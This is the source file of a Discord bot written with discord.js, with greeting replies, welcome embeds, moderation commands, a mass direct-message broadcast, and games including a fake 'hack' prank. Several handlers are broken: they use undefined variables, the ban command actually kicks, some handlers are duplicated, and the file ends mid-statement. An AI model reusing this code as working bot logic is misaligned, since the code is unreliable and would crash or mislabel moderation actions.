const Discord = require('discord.js');
const client = new Discord.Client();
const prefix = '='

client.on('ready', () => {
  console.log(`Logged in as ${client.user.tag}!`);
client.user.setActivity("Hi",{type: 'WATCHING'})
  console.log('')
  console.log('')
  console.log('╔[════════════════════════════════════════════════════════════════]╗')
  console.log(`[Start] ${new Date()}`);
  console.log('╚[═════════════════════════════════════════════════════════════════]╝')
  console.log('')
  console.log('╔[════════════════════════════════════]╗');
  console.log(`Logged i as * [ " ${client.user.username} " ]`);
  console.log('')
  console.log('Informatins :')
  console.log('')
  console.log(`servers! [ " ${client.guilds.size} " ]`);
  console.log(`Users! [ " ${client.users.size} " ]`);
  console.log(`channels! [ " ${client.channels.size} " ]`);
  console.log('╚[════════════════════════════════════]╝')
  console.log('')
  console.log('╔[════════════]╗')
  console.log(' Bot Is Online')
  console.log('╚[════════════]╝')
  console.log('')
  console.log('')
});


client.on('message', m => {
    if(m.content.startsWith('هلا')) {
        m.reply('**هلا بك، منور :rose: :heart_eyes:**')
    }
});

client.on('message', m => {
    if(m.content.startsWith('السلام عليكم')) {
        m.reply('**.وعليكم السلام ورحمة الله تعالى وبركاته :rose: :wave:**')
    }
});

client.on('message', m => {
    if(m.content.startsWith('هاي')) {
        m.reply('**هايات ي غالي منورر , ء . :heart_eyes: **')
    }
});


client.on('message', m => {
    if(m.content.startsWith('عندك فولتارين؟')) {
        m.reply('**حوتو ف تيبة قلبك :slight_smile:**')
    }
});
//
//
//





client.on('guildMemberAdd', member => {
    let channel = member.guild.channels.find('name', 'welcome');
    let memberavatar = member.user.avatarURL
      if (!channel) return;
    let embed = new Discord.RichEmbed()
        .setColor('RANDOM')
        .setThumbnail(memberavatar)
        .addField('🎽 | Your name:  ',`${member}`)
        .addField('📢 ' , `Welcome to the server, ${member}`)
        .addField('🆔 | Your ID:', "**[" + `${member.id}` + "]**" )
                .addField('➡| You\'re the member number:',`${member.guild.memberCount}`)
               
                  .addField("Name:",`<@` + `${member.id}` + `>`, true)
                     
                                     .addField(' Server:', `${member.guild.name}`,true)
                                       
     .setFooter(`${member.guild.name}`)
        .setTimestamp()
   
      channel.sendEmbed(embed);
    });

    client.on('guildMemberAdd', member => {
        let memberavatar = member.user.avatarURL
          if (!channel) return;
        let embed = new Discord.RichEmbed()
            .setColor('RANDOM')
            .setThumbnail(memberavatar)
            .addField('🎽 | Your name:  ',`${member}`)
            .addField('📢 ' , `Welcome to the server, ${member}`)
            .addField('🆔 | Your ID:', "**[" + `${member.id}` + "]**" )
                    .addField('➡| You\'re the member number:',`${member.guild.memberCount}`)
                   
                      .addField("Name:",`<@` + `${member.id}` + `>`, true)
                         
                                         .addField(' Server:', `${member.guild.name}`,true)
                                           
         .setFooter(`${member.guild.name}`)
            .setTimestamp()
       
          message.member.sendEmbed(embed);
        });
        
    
    client.on('guildMemberRemove', member => {
        var embed = new Discord.RichEmbed()
            .setAuthor(`${member}`)
            .addField('Server, 📢 ', `${member.guild.name}`)
            .addField('Joined us at, 🕜', `${member.guild.joinedAt.toLocaleString()}`, true)
            .addField('Members left, 👤', `${member.guild.memberCount}`, true)
            .setFooter('We\'ll all miss you. 💔');
    
    var channel = member.guild.channels.find('name', 'welcome')
    if (!channel) return;
    message.member.sendEmbed(embed);
    });

    client.on('guildMemberRemove', member => {
        var embed = new Discord.RichEmbed()
            .setAuthor(`${member}`)
            .addField('Server, 📢 ', `${member.guild.name}`)
            .addField('Joined us at, 🕜', `${member.guild.joinedAt.toLocaleString()}`, true)
            .addField('Members left, 👤', `${member.guild.memberCount}`, true)
            .setFooter('We\'ll all miss you. 💔');
    
    var channel = member.guild.channels.find('name', 'welcome')
    if (!channel) return;
    message.channel.sendEmbed(embed);
    });

// Streaming + Console logging.
client.on('ready', async => {
    console.log(`----------------`);
       console.log(`Cave. Bot By Vaniet.`);
         console.log(`----------------`);
       console.log(`ON ${client.guilds.size} Servers ' By: Vaniet ' `);
     console.log(`----------------`);
   console.log(`Logged in as ${client.user.tag}!`);
  });

  client.on('ready', function(){
    var ms = 10000 ;
    var setGame = [`=help | =inv || ${client.guilds.size} Servers!`,`=help | =inv || ${client.users.size} Users!`];
    var i = -1;
    var j = 0;
    setInterval(function (){
        if( i == -1 ){
            j = 1;
        }
        if( i == (setGame.length)-1 ){
            j = -1;
        }
        i = i+j;
        client.user.setGame(setGame[i],`http://www.twitch.tv/9ivv`);
    }, ms);

});

// Ready.
client.on('ready', async => {
    console.log('I am ready! :D');
    
});


//cmddd Channels. =channels
client.on('message', message => {
    if (message.content.startsWith(prefix + "channels")) {
    if(!message.channel.guild) return message.channel.send('**This Command Only For Servers !**')
            if (!message.member.hasPermission('MANAGE_CHANNELS')) return message.channel.send(`**${message.author.username} You Dont Have** ``MANAGE_CHANNELS`` **Premission**`);
     message.guild.createChannel('wlc', 'text')
     message.guild.createChannel('info', 'text')
     message.guild.createChannel('news', 'text')
     message.guild.createChannel('f5r', 'text') 
     message.guild.createChannel('gifts', 'text')
     message.guild.createChannel('chat', 'text')
	 message.guild.createChannel('pic', 'text')
     message.guild.createChannel('bot', 'text')
     message.guild.createChannel('bo7', 'text')
     message.guild.createChannel('Event-Chat', 'text')
     message.guild.createChannel('Events', 'voice')
     message.guild.createChannel('Talk.', 'voice')
     message.guild.createChannel('Chill.', 'voice')
     message.guild.createChannel('Coffe.', 'voice')
     message.guild.createChannel('Down.', 'voice')
     message.guild.createChannel('One ,', 'voice')
     message.guild.createChannel('Double ,', 'voice')
     message.guild.createChannel('Triple ,', 'voice')
     message.guild.createChannel('Squad ,', 'voice')
     message.guild.createChannel('Minecraft #', 'voice')
     message.guild.createChannel('Fortnite #', 'voice')
     message.guild.createChannel('Creative #', 'voice')
     message.guild.createChannel('Brawlahalla #', 'voice')
     message.guild.createChannel('Sleeeeeep.', 'voice')

.then(message.channel.sendMessage('**Done, channels has been created succesfully. :white_check_mark: **'))
.then(msg => {
    msg.delete(3000)
  })}
});
 

client.on('message', message => {
    if(message.content.startsWith(prefix + 'clear')) {
        if(message.channel.type == 'dm') return;
        if(message.member.hasPermissions('MANAGE_MESSAGES')) {
            message.channel.fetchMessages()
                .then(list => {
                    message.channel.bulkDelete(list)
                    .then(message.channel.send('```md\n# Chat has been cleard succesfully.```'))
                    .then(msg => {
                        msg.delete(3000);
                    })
                })
        }
    }
});




//cmddd Skin. =skin
client.on("message", message => {
    if (!message.content.startsWith(prefix)) return;
      let command = message.content.split(" ")[0];
      command = command.slice(prefix.length);
        if(command === "skin") {
                const args = message.content.split(" ").slice(1).join(" ")
        if (!args) return message.channel.send("**Please provide a username. :x:**");
        var image = new Discord.Attachment(`https://minotar.net/avatar/${args}`, "skin.png");
    message.channel.send(image)
        }
    });

  

//cmddd Email. =email
client.on("message", (message) => {
    if(message.content.startsWith(prefix + 'email')) {
        message.channel.send(JSON.stringify({
            email: Math.random().toString(36).slice(4).trim()+'@gmail.com',
            password: Math.random().toString(36).slice(4).trim()
        }))
    }
  });


//cmddd Server. =server

client.on('message', msg => {
    if(msg.content.startsWith (prefix + 'server')) {
      if(!msg.channel.guild) return;
      let embed = new Discord.RichEmbed()
      .setColor('RANDOM')
      .setThumbnail(msg.guild.iconURL)
      .addField(':globe_with_meridians: **Name : **' , `**[ ${msg.guild.name} ]**`,true)
      .addField(':earth_africa: ** Region:**',`**[ ${msg.guild.region} ]**`,true)
      .addField(':military_medal:** Roles :**',`**[ ${msg.guild.roles.size} ]**`,true)
      .addField(':bust_in_silhouette:** Members :**',`**[ ${msg.guild.memberCount} ]**`,true)
      .addField(':white_check_mark:** Online :**',`**[ ${msg.guild.members.filter(m=>m.presence.status == 'online').size} ]**`,true)
      .addField(':pencil:** TextChannels :**',`**[ ${msg.guild.channels.filter(m => m.type === 'text').size} ]**`,true)
      .addField(':loud_sound:** VoiceChannels :**',`**[ ${msg.guild.channels.filter(m => m.type === 'voice').size} ]**`,true)
      .addField(':crown:** Owner :**',`**[ ${msg.guild.owner} ]**`,true)
      .addField(':id:** ID :**',`**[ ${msg.guild.id} ]**`,true)
      .addField(':date:** Created At : **',msg.guild.createdAt.toLocaleString())
      .addField(':sleeping:**AFKChannel :**',`**${msg.guild.afkChannel || 'None'}**`, true)
      .addField(':upside_down:** Emojis :**', `**${msg.guild.emojis.size}** \`[\` **${msg.guild.emojis.map(m => m).join('**|**')} \`]\`**`, true);
      msg.channel.send({embed:embed});
    }
  });



//cmddd ID. =id
client.on('message', message => {
    var args = message.content.split(" ").slice(1);
    if(message.content.startsWith(prefix + 'id')) {
    var year = message.author.createdAt.getFullYear()
    var month = message.author.createdAt.getMonth()
    var day = message.author.createdAt.getDate()
    var men = message.mentions.users.first();
    let args = message.content.split(' ').slice(1).join(' ');
    if (args == '') {
    var z = message.author;
    }else {
    var z = message.mentions.users.first();
    }
    
    let d = z.createdAt;
    let n = d.toLocaleString();
    let x;
    let y;
    
    if (z.presence.game !== null) {
    y = `${z.presence.game.name}`;
    } else {
    y = "Not Playing... |💤.";
    }
    if (z.bot) {
    var w = 'Bot';
    }else {
    var w = 'Person';
    }
   let embed = new Discord.RichEmbed()
    .setColor("RANDOM")
    .addField('**🔱| Name:**',`**<@` + `${z.id}` + `>**`, true)
    .addField('**📠 | ID:**:', "**"+ `${z.id}` +"**",true)
    .addField('**🎮 | Game:**','**'+y+'**' , true)
    .addField('**🤖| Type:**',"**"+ w + "**",true)
    .addField('**📛| Tag:**',"**#" +  `${z.discriminator}**`,true)
    .addField('**📆| Joined discord at:** ' ,year + "-"+ month +"-"+ day)
    .addField("**⌚| Joined server at:**", message.member.joinedAt.toLocaleString())
    .setThumbnail(`${z.avatarURL}`)
    .setFooter(message.author.username, message.author.avatarURL)
    
    message.channel.send({embed});
    
    }
    
});
 
//cmddd Avatar. =avatar 

client.on('message', message => {

    if (message.content.startsWith(prefix + 'avatar')) {
      var mentionned = message.mentions.users.first();
  var fm;
    if(mentionned){
        var fm = mentionned;
    } else {
        var fm = message.author;
  
    }
      const embed = new Discord.RichEmbed()
      .setTitle(`󠂪❋ Requested By: **${message.author.username}** ❋`)
      .setImage(`${fm.avatarURL}`)
      .setColor("RANDOM")
      .setFooter(`❋ ${fm.username}'s Avatar ❋`)
      message.channel.sendEmbed(embed);
  
    }
});
  

//cmddd Giphy. =gif
const giphy = require('giphy-api')();
    function getValue(key, array) {
  for (var el in array) {
    if (array[el].hasOwnProperty(key)) {
      return array[el][key];
    }
  }
}

client.on('message', message => {
    if(message.content.startsWith(prefix + 'gif')) {
        sb = message.content.substring(4)
      giphy.random({
        tag: sb,
        rating: 'g',
        fmt: 'json'
      }, function(err, res) {
        if (getValue("image_url", res)) {
          message.channel.send({files:[{
              attachment: getValue("image_url", res),
              name: 'gif'+sb+'.gif'
          }]
        });
        }

      });
      }
});


//cmddd BCall. =bcall
client.on('message', async message => {
    if(message.content.startsWith(prefix + "bcall")) {
      let i = client.users.size;
      if(message.author.id !== '410778583682777098') return message.channel.send('**❎ This command is for bot owner only. **');
      var args = message.content.split(' ').slice(1).join(' ');
      if(!args) return message.channel.send('**You have to type a message. ❎**')
      setTimeout(() => {
        message.channel.send(`**Message has been sent to __${i}__ users.**`)
      }, client.users.size * 500);
      client.users.forEach(s => {
        s.send(args).catch(e => i--);
      });
    }
  });

//cmddd Marry. =marry
client.on('message', message => {
    if(message.content.startsWith(prefix + 'marry')) {
    if(!message.channel.guild) return message.reply('**:x: This command only for servers **')
    var proposed = message.mentions.members.first()
   
    if(!message.mentions.members.first()) return message.reply(' 😏 **You have to choose someone to marry.**').catch(console.error);
      if(proposed === client.user) return message.reply(`**Do you accept me as your child's father?**`);
            message.channel.send(`**${proposed} 
 ${message.author} Has asked if you want to accept to marry them
you have only 15 seconds  
type __( yes / no )__ if you want to accept or no.**`)

const filter = m => m.content.startsWith("yes");
message.channel.awaitMessages(filter, { max: 1, time: 15000, errors: ['time'] })
.then(collected =>{ 
  message.channel.send(` **Congratulations! You are now married, Hope you have a good life together ${message.author} & ${proposed}** `);
})

 const filte = m => m.content.startsWith("no");
message.channel.awaitMessages(filte, { max: 1, time: 15000, errors: ['time'] })
.then(collected =>{ 
 message.channel.send(`  **${message.author}, You have been declined by ${proposed}** `);
})
      
}
});


//cmddd Slots. =slots
client.on('message', message => {
    if(message.content.startsWith(prefix + 'slots')) {
      let slot1 = ['🍏', '🍇', '🍒', '🍍', '🍅', '🍆', '🍑', '🍓'];
      let slots1 = `${slot1[Math.floor(Math.random() * slot1.length)]}`;
      let slots2 = `${slot1[Math.floor(Math.random() * slot1.length)]}`;
      let slots3 = `${slot1[Math.floor(Math.random() * slot1.length)]}`;
      let we;
      if(slots1 === slots2 && slots2 === slots3) {
        we = " : ** You won   ** ."
      } else {
        we = ": ** You lost ** ."
      }
      message.channel.send(`${slots1} | ${slots2} | ${slots3} - ${we}`)
    }
    });




//cmddd Hack. =hack
client.on('message', message => {
    if (message.content.startsWith(prefix + "hack")) {
      if (message.author.bot) return
           message.delete();
             let args = message.content.split(' ').slice(1);
                   let virusname = args.join(' ');
                 if (virusname < 1) {
                     return message.channel.send("```Please select a person to hack.```");
                                     }
                 message.channel.send({embed: new Discord.RichEmbed().setTitle('Loading ' + virusname + "...").setColor(0xFF0000)}).then(function(m) {
             setTimeout(function() {
               m.edit({embed: new Discord.RichEmbed().setTitle('[' + virusname + ']: Loading Discord Virus [▓ ] 1%').setColor(0xFF0000)})
             }, 1000)
            setTimeout(function() {
               m.edit({embed: new Discord.RichEmbed().setTitle('[' + virusname + ']: Loading Discord Virus [▓▓▓▓] 25%').setColor(0xFF0000)})
             }, 2000)
           setTimeout(function() {     
               m.edit({embed: new Discord.RichEmbed().setTitle('[' + virusname + ']: Loading Discord Virus [▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓ ] 100%').setColor(0xFF0000)})
             }, 3000)
                setTimeout(function() {
               m.edit({embed: new Discord.RichEmbed().setTitle('[' + virusname + ']: Uploaded! Initiating explosion in 1...').setColor(0xFF0000)})
             }, 4000)
              setTimeout(function() {
               m.delete()
           }, 5000)
             setTimeout(function() {
               message.channel.send('```Target Is Hacked.```')
           }, 6000)
           });
         }
 });

//Welcoming...
const moment = require('moment');

client.on("guildMemberAdd", member => {
let welcomer = member.guild.channels.find("name","welcome");
      if(!welcomer) return;
      if(welcomer) {
         moment.locale('ar-ly');
         var h = member.user;
        let Cave = new Discord.RichEmbed()
        .setColor('RANDOM')
        .setThumbnail(h.avatarURL)
        .setAuthor(h.username,h.avatarURL)
        .addField('Joined Discord At:',`${moment(member.user.createdAt).format('D/M/YYYY h:mm a')} **\n** \`${moment(member.user.createdAt).fromNow()}\``,true)            
         .addField('Joined Server At:',`${moment(member.joinedAt).format('D/M/YYYY h:mm a ')} \n\`\`${moment(member.joinedAt).startOf(' ').fromNow()}\`\``, true)      
         .setFooter(`${h.tag}`,"https://images-ext-2.discordapp.net/external/JpyzxW2wMRG2874gSTdNTpC_q9AHl8x8V4SMmtRtlVk/https/orcid.org/sites/default/files/files/ID_symbol_B-W_128x128.gif")
     welcomer.send({embed:Cave});          
               
 
      }
      });
//cmddd Report. =report
client.on('message', message =>{
        let messageArray = message.content.split(" ");
        let cmd = messageArray[0];
        let args = messageArray.slice(1);
        let prefix = '=';
         
        if(cmd === `${prefix}report`){
            let rUser = message.guild.member(message.mentions.users.first() || message.guild.members.get(args[0]));
            if(!rUser) return message.channel.send("**Please mention a user to make a report on them. :x:**");
            let reason = args.join(" ").slice(22);
            if(!reason) return message.channel.send("**Please provide a report reason, also you can provide an attachment with it! :dove:**");
        
            let reportEmbed = new Discord.RichEmbed()
            .setTitle("﹥Report")
            .setColor("RANDOM")
            .addField("❋ Reported User :", `${rUser} (${rUser.id})`)
            .addField("❋ Report Creator :", `${message.author} (${message.author.id})`)
            .addField("❋ Reported In :", message.channel)
            .addField("❋ Report Time :", message.createdAt.toLocaleString(),true)
            .addField("❋ Report Reason :", reason);
        
            let reportschannel = message.guild.channels.find(`name`, "reports");
            if(!reportschannel) return message.channel.send("**Couldn't find the follwing channel: `report`**");
        
        
            message.delete().catch(O_o=>{});
            message.author.send(`**<@${rUser.id}> Has been reported sucessfully.**`)
            reportschannel.send(reportEmbed)
            if(message.attachments.first()) {
                reportschannel.sendFile(message.attachments.first().url).catch();
            }
        };
    });

//cmddd Invite. =inv
client.on('message' , message => {

    if (message.content === "=inv") {
     const embed = new Discord.RichEmbed()
 .setColor("RANDOM")
 .setThumbnail(client.user.avatarURL)
.setTitle('Click to invite me to your server!')
.setURL('https://discordapp.com/oauth2/authorize?client_id=461191968920436738&permissions=8&scope=bot')
  message.channel.sendEmbed(embed);
   }
});

//cmddd MembersChannel. =mchc

client.on('message', message => {
    if (message.content.startsWith(prefix + "mchc")) {
    if(!message.channel.guild) return message.channel.send('**This Command Only For Servers !**')
            if (!message.member.hasPermission('MANAGE_CHANNELS')) return message.channel.send(`**${message.author.username} You Dont Have** ``MANAGE_CHANNELS`` **Premission**`);
     message.guild.createChannel(`°${message.guild.memberCount} Members.`, 'voice')

     message.channel.sendMessage('**Done. | :white_check_mark: **')
}
});

//cmddd Temporary Channels. =temp / =temp-close
const temp = {};
client.on('message', async message => {
 if(message.channel.type === "dm") return;
  if(message.author.bot) return;
   if(!temp[message.guild.id]) temp[message.guild.id] = {
    time: "3000",
     category : 'click here',
      channel : 'click here'
       }
        if(message.content.startsWith(prefix + 'temp')){
         if(!message.member.hasPermission(`MANAGE_GUILD`)) return;
          var ggg= message.guild.createChannel('click here', 'category').then(cg => {
           var ccc =message.guild.createChannel('click here', 'voice').then(ch => {
            ch.setParent(cg)
             message.channel.send('**Channel has been created sucessfully... :white_check_mark: **')
              client.on('message' , message => {
               if(message.content.startsWith(prefix + 'temp-close')) {
                if(!message.member.hasPermission(`MANAGE_GUILD`)) return;
                 cg.delete()
                  ch.delete()
                   message.channel.send('**Channel has been removed sucessfully... :white_check_mark:**  ')
                    }
                     });
                      const time = temp[message.guild.id].time
                       client.on('message' , message => {
                        if (message.content === "fgfdkjfdhfgdjghdhghj") {
                         if(!message.member.hasPermission(`MANAGE_GUILD`)) return;
                          let newTime= message.content.split(' ').slice(1).join(" ")
                          if(!newTime) return message.reply(`**${prefix}temptime <time>  \`1000 = 1s\`**`)
	                 if(isNaN(newTime)) return message.reply(`** The Time Be Nambers :face_palm: **`);
	                if(newTime < 1) return message.reply(`**The Time Be Up \`3000s\`**`)
                       temp[message.guild.id].time = newTime
                      message.channel.send(`**Temp Rooms Time Change To \`${newTime}\`**`);
                     }
                    });
                   client.on('voiceStateUpdate', (old, neww) => {
                  let newUserChannel = neww.voiceChannel
                 let oldUserChannel = old.voiceChannel
                temp[message.guild.id].category = cg.id
               temp[message.guild.id].channel = ch.id
              let channel = temp[message.guild.id].channel
             let category = temp[message.guild.id].category
            if(oldUserChannel === undefined && newUserChannel !== undefined && newUserChannel.id == channel) {
           neww.guild.createChannel(neww.displayName , 'voice').then(c => {
          c.setParent(category)
         let scan = setTimeout(()=>{
        if(!neww.voiceChannel) {
       c.delete();
      client.channels.get(channel).overwritePermissions(neww, {
     CONNECT:true,
    SPEAK:true
   })
  }
 }, temp[neww.guild.id].time);
  c.overwritePermissions(neww, {
   CONNECT:true,
    SPEAK:true,
     MANAGE_CHANNEL:true,
      MUTE_MEMBERS:true,
       DEAFEN_MEMBERS:true,
	MOVE_MEMBERS:true,
	 VIEW_CHANNEL:true
	  })
	   neww.setVoiceChannel(c)
            })
             client.channels.get(channel).overwritePermissions(neww, {
	      CONNECT:false,
	       SPEAK:false
		})
               }
              })
             })
           })
          }
      });



//cmddd Ban. =ban
client.on("message", async message => {
        if(message.author.bot) return;
        if(message.channel.type === "dm") return;
  
        let prefix = "=";
        let messageArray = message.content.split (" ");
        let cmd = messageArray[0];
        let args = messageArray.slice(1);
  
  
  
          if(cmd === `${prefix}ban`){
  
  
  
            let kUser = message.guild.member(message.mentions.users.first() || message.guild.members.get(args[0]));
            if(!kUser) return message.channel.send("**Couldn't find the member. :x: **");
            let kReason = args.join(" ").slice(22);
            if(!message.member.hasPermission("MANAGE_CHANNELS")) return message.channel.send("**You're missing the following permissions. `MANAGE_CHANNELS`**");
            if(kUser.hasPermission("MANAGE_CHANNELS")) return message.channel.send("**Error: You can't do this command against an admin in this server.**")
  
            let banEmbed = new Discord.RichEmbed()
            .setDescription("-Ban.")
            .setColor("#8e0505")
            .addField("Banned User", `${bUser} with ID ${bUser.id}`)
            .addField("Banned By", `<@${message.author.id}> with the id ${message.author.id}`)
            .addField("Banned In", message.channel)
            .addField("Time", message.createdAt)
            .addField("Reason", kReason);
  
            let banChannel = message.guild.channels.find('name', 'log');
            if(!banChannel) return message.channel.send("**Error: I couldn't find the following channel: `log`**");
  
            message.guild.member(bUser).kick(bReason)
            banChannel.send(banEmbed);
          }
          });

//cmddd Kick. =kick
          client.on("message", async message => {
  if(message.author.bot) return;
  if(message.channel.type === "dm") return;

  let prefix = "=";
  let messageArray = message.content.split (" ");
  let cmd = messageArray[0];
  let args = messageArray.slice(1);



    if(cmd === `${prefix}kick`){



      let kUser = message.guild.member(message.mentions.users.first() || message.guild.members.get(args[0]));
      if(!kUser) return message.channel.send("**Couldn't find the member. :x: **");
      let kReason = args.join(" ").slice(22);
      if(!message.member.hasPermission("MANAGE_CHANNELS")) return message.channel.send("**You're missing the following permissions. `MANAGE_CHANNELS`**");
      if(kUser.hasPermission("MANAGE_CHANNELS")) return message.channel.send("**Error: You can't do this command against an admin in this server.**")

      let kickEmbed = new Discord.RichEmbed()
      .setDescription("-Kick.")
      .setColor("#e56b00")
      .addField("Kicked User", `${kUser} with ID ${kUser.id}`)
      .addField("Kicked By", `<@${message.author.id}> with the id ${message.author.id}`)
      .addField("Kicked In", message.channel)
      .addField("Time", message.createdAt)
      .addField("Reason", kReason);

      let kickChannel = message.guild.channels.find('name', 'log');
      if(!kickChannel) return message.channel.send("**Error: I couldn't find the following channel: `log`**");

      message.guild.member(kUser).kick(kReason)
      kickChannel.send(kickEmbed);
    }
    });




//cmddd Bot. =bot
client.on('message', message => {
    if (message.content.startsWith(prefix + "bot")) {
let embed = new Discord.RichEmbed()
.setTitle(`${client.user.username} :sparkles:`)
.setThumbnail(`${client.user.avatarURL}`)
.addField('**-Servers joined :**',`**[${client.guilds.size}]**`)
.addField('**-Members :**',`**[${client.users.size}]**`)
.addField('**-Chnnels :**',`**[${client.channels.size}]**`)
.addField('**-Ping :**',`**[${Date.now() - message.createdTimestamp}]**`)
.addField('**-My language :**','**Node.js**')
.addField('**-Devoloped By:**','**Vaniet**')
.setColor('#7d2dbe')
.setFooter(`${client.user.username}`)
message.channel.sendEmbed(embed);
}
});


//cmddd Colors. =colors
client.on('message', msg => {

    if (msg.content ===  prefix + 'colors'){
                if (!msg.member.hasPermission('MANAGE_ROLES')) return msg.channel.sendMessage('**You\'re missing the following permissions: `MANAGE_ROLES` :x:**')
        msg.channel.send('**Creating colors... :robot:**')
                    setInterval(function(){})
                      let count = 0;
                      let ecount = 0;
            for(let x = 1; x < 101; x++){
              msg.guild.createRole({name:x,
                color: 'RANDOM'})
                }
              }
         });



client.on('message', message => {
               if(!message.channel.guild) return;
            if(message.content.startsWith(prefix + 'help')) {
            if(!message.channel.guild) return;
            let embedit = new Discord.RichEmbed()
            .setThumbnail(message.author.avatarURL)
            .setColor("RANDOM")
            .setTitle(`** [ Help. ] **`)
            .setDescription(`**Admins commands.🔨\nGlobal commands. 🌐**`)
            message.channel.sendEmbed(embedit)
             .then(msg => {
               msg.react('🌐')
               .then(msg.react('🔨'))
             let AdminsHelpFilter = (reaction, user) => reaction.emoji.name === '🔨' && user.id === message.author.id;
            let GeneralHelpFilter = (reaction, user) => reaction.emoji.name === '🌐' && user.id === message.author.id;
            let AdminsHelp = msg.createReactionCollector(AdminsHelpFilter, { time: 60000 });
            let GlobalHelp = msg.createReactionCollector(GeneralHelpFilter, { time: 60000 });
         
            AdminsHelp.on("collect", r => {
            message.channel.send(`**:ballot_box_with_check: Sent.**`).then(m => m.delete(5000)).then(msg.delete());
            var embed = new Discord.RichEmbed()
            .setColor('RANDOM')
            .setTitle('**Help. 📬**')
            .setThumbnail(`${client.user.avatarURL}`)
            .addField("**__=bc__**","**برودكاست لكل الأعضاء**")
            .addField("**__=channels__**","**عمل شكل الرومات الأساسي في اغلب السيرفرات `BETA`** ")
            .addField("**__=clear__**","**مسح الشات**")
            .addField("**__=mchc__**","**عمل روم عدد الأعضاء**")
            .addField("**__=ban__**","**تبنيد العضو **")
            .addField("**__=mute__**","**عمل ميوت للعضو**")
            .addField("**__=unmute__**","**فك الكتم عن العضو**")
            .addField("**__=kick__**","**طرد العضو**")
            .addField("**__=colors__**","**عمل 100 لون في ثواني بألوان مختلفة**")
            .addField("**__=move__**","**لسحب أي عضو الى رومك الصوتي الحالي**")
            .addField("**__=lockchannel__**","**عمل ميوت للروم كامل**")
            .addField("**__=unlockchannel__**","**فك الميوت عن الروم كامل**")
            .addField("**__=roles__**","**لعرض كافة الرتب في السيرفر**")
            .addField("**__=nuke__**","**اعادة تهيئة السيرفر مسح جميع الرومات والرتب، اونر السيرفر فقط**")
            message.member.sendEmbed(embed)
            message.delete();
            })
           GlobalHelp.on("collect", r => {
             message.channel.send(`**:ballot_box_with_check: Sent.**`).then(m => m.delete(5000)).then(msg.delete());
             var embed = new Discord.RichEmbed()
             .setColor('RANDOM')
             .setTitle('**Help. 📬**')
             .setThumbnail(`${client.user.avatarURL}`)
             .addField("**__=avatar__**","**عرض صورتك الشخصية أو صورة أي عضو آخر**")
             .addField("**__=server__**","**عرض جميع معلومات السيرفر**")
              .addField("**__=id__**","**عرض معلومات عامة عنك أو اي عضو تحدده**")
          .addField("**__=help__**","**ارسال هذه القائمة للعضو في الخاص**")
          .addField("**__=gif__**","** ارسال صور متحركة عشوائية لا نهائية**")
          .addField("**__=bot__**","**عرض معلومات عن البوت**")
          .addField("**__=skin__**","**عمل صورة الوجه لسكن الاسم الذي تكتبه في ماينكرافت**")
          .addField("**__=marry__**","**لعبة الزواج**")
          .addField("**__=slots__**","**لعبة الفواكه**")
          .addField("**__=hack__**","**لعبة التهكير**")
          .addField("**__=report__**","**عمل بلاغ على اي عضو قام بمخالفة القوانين**")
          .addField("**__=inv__**","**لدعوة البوت الى سيرفرك**")
          .addField("**__=temp__**","**عمل روم مؤقت باسمك لا يمكن لغيرك دخوله او رؤيته**")
          .addField("**__=temp-close__**","**لاغلاق الروم المؤقت بعد استخدامه**")
          .addField("**__=email__**","**يعطي لك ايميل وباسورد لحساب جيميل وهمي عشوائي**")
             message.member.sendEmbed(embed)
             message.delete();
             })
           })
            }
            });
         

//cmddd Roles. =roles
var AsciiTable = require('ascii-data-table').default
client.on('message', message =>{

    if(message.content == "=roles"){
        if(!message.author.hasPermissions('MANAGE_ROLES')) return;
        var 
        ros=message.guild.roles.size,
        data = [['Rank', 'RoleName']]
        for(let i =0;i<ros;i++){
            if(message.guild.roles.array()[i].id !== message.guild.id){
         data.push([i,`${message.guild.roles.filter(r => r.position == ros-i).map(r=>r.name)}`])
        }}
        let res = AsciiTable.table(data)

        message.channel.send(`**\`\`\`xl\n${res}\`\`\`**`);
    }
});
  //cmddd Mute & Unmute Channel. =mutechannel / =unmutechannel
client.on('message', message => {
    var prefix = "=";
           if(message.content === prefix + "lockchannel") {
                               if(!message.channel.guild) return message.reply('** This command only for servers**');
    
       if(!message.member.hasPermission('MANAGE_MESSAGES')) return message.reply(' **__You\'re missing the following permissons: `MANAGE_MESSAGES`__**');
                  message.channel.overwritePermissions(message.guild.id, {
                SEND_MESSAGES: false
    
                  }).then(() => {
                      message.reply("**__Chat has been locked.__ ✅ **")
                  });
                    }

        if(message.content === prefix + "unlockchannel") {
                            if(!message.channel.guild) return message.reply('** This command only for servers**');
    
       if(!message.member.hasPermission('MANAGE_MESSAGES')) return message.reply('**__You\'re missing the following permissons: `MANAGE_MESSAGES`__**');
                  message.channel.overwritePermissions(message.guild.id, {
                SEND_MESSAGES: true
    
                  }).then(() => {
                      message.reply("**__Chat has been unlocked. __✅**")
                  });
        }
           
    });

//cmddd Move. =move
client.on('message', message => {
var prefix = '=';
if(!message.channel.guild) return;
if(message.content.startsWith(prefix + 'move')) {
 if (message.member.hasPermission("MOVE_MEMBERS")) {
 if (message.mentions.users.size === 0) {
 return message.channel.send("```md\n# The right usage: " +prefix+ "move [USER]```")
}
if (message.member.voiceChannel != null) {
 if (message.mentions.members.first().voiceChannel != null) {
 var authorchannel = message.member.voiceChannelID;
 var usermentioned = message.mentions.members.first().id;
var embed = new Discord.RichEmbed()
 .setTitle("Successd!")
 .setColor("#000000")
 .setDescription(`You have moved <@${usermentioned}> to your voice channel. ✅ `)
var embed = new Discord.RichEmbed()
.setTitle(`You are Moved in ${message.guild.name}`)
 .setColor("RANDOM")
.setDescription(`**<@${message.author.id}> Moved You To His Channel!\nServer --> ${message.guild.name}**`)
 message.guild.members.get(usermentioned).setVoiceChannel(authorchannel).then(m => message.channel.send(embed))
message.guild.members.get(usermentioned).send(embed)
} else {
message.channel.send("```md\n# You can't move "+ message.mentions.members.first() +" ```Member should've to be in a voice channel for this.``")
}
} else {
 message.channel.send("**```md\n# You have to be in a voice channel.```**")
}
} else {
message.react("❌")
 }}});


 

 client.on('message', message => {
    if (!message.content.startsWith(prefix)) return;
    var args = message.content.split(' ').slice(1);
    var argresult = args.join(' ');
    if (message.author.id !== "410778583682777098") return;


    if (message.content.startsWith(prefix + 'setwatch')) {
    client.user.setActivity(argresult, {type: 'WATCHING'})
       console.log('test' + argresult);
      message.channel.sendMessage(`Watching Now: **${argresult}**`)
  }


    if (message.content.startsWith(prefix + 'setlis')) {
    client.user.setActivity(argresult, {type: 'LISTENING'})
       console.log('test' + argresult);
